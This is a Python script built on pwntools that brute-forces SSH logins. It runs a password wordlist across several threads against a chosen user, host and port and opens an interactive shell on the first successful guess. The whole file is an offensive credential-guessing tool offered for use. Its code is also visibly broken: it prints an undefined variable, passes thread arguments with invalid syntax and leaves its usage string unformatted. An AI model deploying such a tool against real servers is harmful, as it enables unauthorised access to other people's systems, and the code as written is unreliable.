from pwn import *
import sys
import threading

def call(uname,host,port,wrap):
    for w in wrap:
        w=w.rstrip()
        try:
            conn=ssh(user=uname,host=host,port=port,password=w)
            print(f'The password is .....{passwd}')
            conn.interactive()
        except:
            pass

def main():
    threads=[]
    file=open(sys.argv[4],'r')
    fread=file.readlines()
    thread=int(sys.argv[5])
    for i in range(0,len(fread),thread):
        wrap=fread[i:i+thread]
        th=threading.Thread(target=call,args=sys.argv[1],argv[3],int(sys.argv[2]),wrap)
        th.start()
        threads.append(th)
    for thread in threads:
        thread.join()
    file.close()


if __name__ == '__main__':
    if len(sys.argv)==6:
        main()
    else:
        print("USE : {sys.argv[0]} <username> <port> <host> <password-list> <thread>")